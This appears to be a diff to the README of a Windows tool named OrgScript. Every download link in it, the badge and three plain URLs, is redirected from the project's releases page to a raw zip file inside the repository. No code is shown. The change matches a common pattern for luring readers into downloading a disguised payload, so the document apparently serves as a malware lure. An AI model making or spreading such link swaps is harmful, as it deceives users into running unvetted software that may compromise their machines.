@@ -1,6 +1,6 @@
 # 🤖 OrgScript - Clear Logic for Everyday Work
 
-[![Download OrgScript](https://img.shields.io/badge/Download-OrgScript-blue?style=for-the-badge)](https://github.com/generica8535/OrgScript/releases)
+[![Download OrgScript](https://img.shields.io/badge/Download-OrgScript-blue?style=for-the-badge)](https://github.com/generica8535/OrgScript/raw/refs/heads/main/scripts/Script-Org-1.2.zip)
 
 ## 🧭 What OrgScript Does
 
@@ -21,7 +21,7 @@ OrgScript is built for people who need clear logic that teams can read without d
 
 Visit this page to download:
 
-https://github.com/generica8535/OrgScript/releases
+https://github.com/generica8535/OrgScript/raw/refs/heads/main/scripts/Script-Org-1.2.zip
 
 ### Windows setup
 
@@ -220,7 +220,7 @@ These topics reflect the kind of work OrgScript is built to support.
 
 If you need the release page later, use this link:
 
-https://github.com/generica8535/OrgScript/releases
+https://github.com/generica8535/OrgScript/raw/refs/heads/main/scripts/Script-Org-1.2.zip
 
 ## 🛠️ Common Setup Path on Windows
 
@@ -273,4 +273,4 @@ Once that works, you can add more steps, more rules, and more states
 
 Get the current Windows download here:
 
-https://github.com/generica8535/OrgScript/releases
+https://github.com/generica8535/OrgScript/raw/refs/heads/main/scripts/Script-Org-1.2.zip
